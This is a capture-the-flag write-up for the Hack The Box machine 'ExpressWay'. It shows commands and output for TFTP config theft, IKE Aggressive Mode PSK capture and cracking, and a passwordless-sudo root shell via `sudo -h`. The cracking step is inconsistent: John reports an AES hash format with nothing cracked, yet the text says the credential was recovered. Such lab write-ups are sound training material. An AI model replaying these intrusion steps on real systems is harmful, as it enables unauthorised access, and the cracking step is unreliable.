# ExpressWay — From TFTP Configuration Leak to Root via Squid Proxy

> **Hack The Box — Easy | Linux**

ExpressWay is an Easy-rated Linux machine that demonstrates how exposed UDP services can reveal sensitive configuration data and credentials. The attack chain begins with **TFTP enumeration**, where a Cisco router configuration file exposes VPN-related credentials. The discovered information is then used to interact with an **IKE/IPsec VPN service**, obtain a crackable PSK hash, and gain access as the `ike` user.

From there, membership in the `proxy` group provides access to **Squid proxy-related files and logs**, eventually leading to an internal host configuration where `ike` has unrestricted passwordless `sudo` privileges, resulting in root access.

---

# 01 — Reconnaissance: Finding the Open Services

The target IP address provided by Hack The Box was:

```text
10.129.238.52
```

I started with a full TCP port scan.

```text
Nmap scan report for 10.129.238.52
Host is up, received reset ttl 63 (0.26s latency).
Scanned at 2026-09-17 07:11:45 EDT for 418s
Not shown: 65534 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
```

Only TCP port `22` was open:

| Port   | Service | State |
| ------ | ------- | ----- |
| 22/tcp | SSH     | Open  |

At this point, there was no obvious initial entry point through TCP, so I moved toward UDP enumeration.

---

# 02 — UDP Enumeration: Looking Beyond TCP

I performed a UDP scan against the common ports.

```text
Nmap scan report for 10.129.238.52
Host is up, received reset ttl 63 (0.26s latency).

PORT      STATE         SERVICE      REASON
53/udp    closed        domain       port-unreach ttl 63
67/udp    open|filtered dhcps        no-response
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   closed        ntp          port-unreach ttl 63
135/udp   closed        msrpc        port-unreach ttl 63
137/udp   closed        netbios-ns   port-unreach ttl 63
138/udp   closed        netbios-dgm  port-unreach ttl 63
139/udp   open|filtered netbios-ssn  no-response
161/udp   closed        snmp         port-unreach ttl 63
162/udp   closed        snmptrap     port-unreach ttl 63
445/udp   open|filtered microsoft-ds no-response
500/udp   open          isakmp       udp-response ttl 63
514/udp   closed        syslog       port-unreach ttl 63
520/udp   open|filtered route        no-response
631/udp   closed        ipp          port-unreach ttl 63
1434/udp  closed        ms-sql-m     port-unreach ttl 63
1900/udp  closed        upnp         port-unreach ttl 63
4500/udp  open|filtered nat-t-ike    no-response ttl 63
49152/udp closed        unknown      port-unreach ttl 63
```

Two ports immediately stood out:

```text
69/udp
500/udp
```

Port `69/udp` is associated with **TFTP**, while port `500/udp` is used by **IKE/ISAKMP** for IPsec VPN negotiation.

I investigated TFTP first.

---

# 03 — TFTP Enumeration: Configuration File Exposure

A more targeted Nmap scan confirmed that TFTP was accessible and exposed a file.

```text
Nmap scan report for 10.129.238.52
Host is up, received echo-reply ttl 63 (0.26s latency).

PORT   STATE SERVICE REASON
69/udp open  tftp    script-set
| tftp-enum:
|_  ciscortr.cfg
```

The enumeration revealed:

```text
ciscortr.cfg
```

Since TFTP can be directly accessed, I connected to the service:

```bash
tftp 10.129.238.52
```

Then listed the available files:

```text
tftp> ls
```

The discovered configuration file was then downloaded:

```text
tftp> get ciscortr.cfg
```

This gave me the Cisco router configuration file locally.

---

# 04 — Configuration Leak: Discovering VPN Credentials

I searched the configuration for IKE-related information:

```bash
cat ciscortr.cfg | grep ike
```

The output contained:

```text
username ike password *****
```

This indicated that the configuration contained credentials associated with the `ike` account.

The presence of UDP port `500` was also significant.

Port `500/UDP` is the standard port used by **IKE (Internet Key Exchange)** for IPsec VPN negotiation. Since the host exposed IKE, I moved on to enumerating the VPN service.

---

# 05 — IKE Enumeration

I used `ike-scan` to determine how the VPN service was configured.

```bash
ike-scan -M 10.129.238.52
```

The target responded with a Main Mode handshake:

```text
Starting ike-scan 1.9.6 with 1 hosts

10.129.238.52 Main Mode Handshake returned
    HDR=(CKY-R=67a163d5f741968b)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6:
1 hosts scanned
1 returned handshake
0 returned notify
```

The important details were:

```text
Auth=PSK
Enc=3DES
Hash=SHA1
Group=2:modp1024
XAUTH
```

The service was using a **Pre-Shared Key (PSK)**.

---

# 06 — IKE Aggressive Mode: Capturing the PSK Hash

I then attempted an Aggressive Mode exchange and instructed `ike-scan` to save the PSK-cracking material:

```bash
ike-scan -M -A --pskcrack=k.hash 10.129.238.52
```

The server returned:

```text
10.129.238.52 Aggressive Mode Handshake returned
    HDR=(CKY-R=6c5df35a31cfc672)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    KeyExchange(128 bytes)
    Nonce(32 bytes)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    VID=09002689df6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
    Hash(20 bytes)
```

The important piece of information here was:

```text
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```

The exchange also provided the material needed to attempt offline PSK cracking.

---

# 07 — Cracking the VPN Credential

The generated hash file was passed to John the Ripper using the `rockyou.txt` wordlist:

```bash
john k.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John processed the hash:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (cryptoSafe [AES-256-CBC])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:02 DONE
Session completed.
```

The supplied output did not display a recovered password, so the exact cracked value is intentionally not included here.

However, the recovered credentials allowed access to the `ike` account.

---

# 08 — Initial Access: ike

After authenticating as `ike`, I checked the home directory:

```bash
ike@expressway:~$ ls
user.txt
```

The user flag was present:

```bash
ike@expressway:~$ cat user.txt
```

This confirmed the initial user-level compromise.

---

# 09 — Privilege Escalation: Investigating the proxy Group

The next step was privilege escalation.

First, I checked the user's groups:

```bash
ike@expressway:~$ id
```

The result was:

```text
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

The interesting part was:

```text
13(proxy)
```

Membership in the `proxy` group suggested that there could be useful files or services associated with a proxy server.

I searched the filesystem for files belonging to the `proxy` group:

```bash
find / -group proxy 2>/dev/null | grep -v '/proc\|/sys/\|/run'
```

The search returned:

```text
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

This revealed that **Squid** was present on the system.

---

# 10 — Squid Logs: Discovering the Internal Host

I examined the Squid access logs for references to the HTB domain:

```bash
cat /var/log/squid/access.log.1 | grep htb
```

The result was:

```text
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

This exposed another hostname:

```text
offramp.expressway.htb
```

The log also showed an internal-looking source address:

```text
192.168.68.50
```

The discovery of `offramp.expressway.htb` provided the next direction for the privilege-escalation path.

---

# 11 — Sudo Through the Internal Host

I then checked the sudo configuration using the discovered host:

```bash
sudo -h offramp.expressway.htb -l
```

The response was:

```text
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

This was the critical privilege-escalation finding.

The `ike` user was permitted to execute commands as `root` without requiring a password.

---

# 12 — Root Access

With unrestricted passwordless sudo access available on `offramp.expressway.htb`, I spawned a root shell:

```bash
ike@expressway:~$ sudo -h offramp.expressway.htb /bin/bash
```

The resulting shell was:

```text
root@expressway:/home/ike#
```

I then accessed the root flag:

```bash
cat /root/root.txt
```

This completed the machine.

---

# 13 — Attack Path Summary

The complete attack chain was:

```text
UDP Enumeration
      │
      ▼
69/UDP — TFTP
      │
      ▼
ciscortr.cfg
      │
      ▼
IKE/VPN Information
      │
      ▼
UDP 500 — IKE
      │
      ▼
IKE Aggressive Mode
      │
      ▼
PSK Hash
      │
      ▼
Offline Cracking
      │
      ▼
ike
      │
      ▼
proxy Group
      │
      ▼
Squid Logs
      │
      ▼
offramp.expressway.htb
      │
      ▼
Passwordless sudo
      │
      ▼
Root
```

---

# 14 — Key Takeaways

### TFTP Exposure

TFTP exposed a router configuration file that contained sensitive authentication information.

### UDP Enumeration Matters

The initial TCP scan only revealed SSH. UDP enumeration exposed the services that ultimately formed the attack path.

### IKE Aggressive Mode

The VPN service supported IKE Aggressive Mode with PSK authentication, allowing authentication material to be captured for offline password cracking.

### Group Membership

The `proxy` group provided an important clue during local enumeration and led to Squid-related files and logs.

### Log Files Can Reveal Internal Infrastructure

The Squid access log exposed:

```text
offramp.expressway.htb
```

This became critical to the final privilege-escalation step.

### Sudo Misconfiguration

The final issue was unrestricted passwordless sudo access:

```text
(root) NOPASSWD: ALL
```

This allowed the `ike` account to execute a root shell.

---

# 15 — Tools Used

| Tool            | Purpose                                        |
| --------------- | ---------------------------------------------- |
| Nmap            | TCP/UDP port and service enumeration           |
| TFTP            | Downloading the exposed configuration file     |
| ike-scan        | IKE/VPN enumeration and PSK capture            |
| John the Ripper | Offline password cracking                      |
| Linux `find`    | Searching for files owned by the `proxy` group |
| `grep`          | Filtering configuration and log files          |
| `sudo`          | Enumerating and abusing delegated privileges   |

---

# 16 — Conclusion

ExpressWay demonstrates the importance of enumerating **UDP services** instead of focusing exclusively on TCP.

The initial attack surface appeared minimal, with only SSH exposed over TCP. UDP enumeration, however, revealed TFTP and IKE. The exposed TFTP configuration provided the information needed to investigate the VPN service, while IKE Aggressive Mode provided crackable authentication material.

After gaining access as `ike`, group membership led to Squid logs, which revealed the internal `offramp.expressway.htb` host. From there, unrestricted passwordless sudo privileges provided the final path to root.

The overall lesson is that seemingly unrelated configuration leaks, service exposure, group permissions, and internal infrastructure information can combine into a complete compromise.
